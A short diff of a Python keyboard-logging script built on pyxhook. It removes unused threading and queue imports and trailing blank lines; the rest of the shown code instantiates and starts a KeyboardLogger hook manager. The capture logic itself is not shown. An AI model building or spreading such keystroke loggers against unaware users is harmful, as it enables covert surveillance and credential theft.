@@ -26,8 +26,6 @@
 from multiprocessing import Process
 import pyxhook
 import time
-import threading
-import queue
 import os
 import sys
 import signal
@@ -68,5 +66,3 @@ if __name__ == '__main__':
     signal.signal(signal.SIGINT, SigIntHandler)                     # Setting the signal handler for SIGINT
     kl = KeyboardLogger()                                           # Instanciating KeyboardLogger
     kl.start()                                                      # Starting the hook manager
-
-
